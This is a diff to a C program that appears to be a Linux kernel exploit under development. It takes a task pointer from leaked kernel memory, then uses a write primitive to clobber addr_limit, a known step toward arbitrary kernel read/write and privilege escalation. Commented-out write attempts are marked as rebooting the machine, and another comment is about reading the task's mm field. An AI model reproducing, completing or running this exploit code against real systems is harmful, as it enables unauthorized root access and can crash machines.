@@ -324,11 +324,19 @@ int main(int argc, char** argv) {
   if (leakSize >= 0xe8 + 0x8) {
       memcpy(&current_ptr, leaked+0xe8, 8);
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
+      printf("my stack = %lx\n", (unsigned long)&leakSize);
       printf("Clobbering addr_limit\n");
+      unsigned long const src=0xFFFFFFFFFFFFFFFEul;
+/*      unsigned char z = 0xFF;
+      clobber_data(current_ptr+8+7, &z, 1); // REBOOTS!
+      clobber_data(current_ptr+8+6, &z, 1); // REBOOTS!
+      clobber_data(current_ptr+8+5, &z, 1); // REBOOTS!
+      clobber_data(current_ptr+8+4, &z, 1); // REBOOTS! */
       unsigned long datum;
-      unsigned long const src=0x191;
       clobber_data((unsigned long)&datum, &src, sizeof(datum));
-      printf("Wrote %lx\n", datum);
+      printf("wrote = %lx\n", (unsigned long)datum);
+      //unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
+      //printf("current->mm == 0x%lx\n", current_mm);
   }
   free(leaked);
   
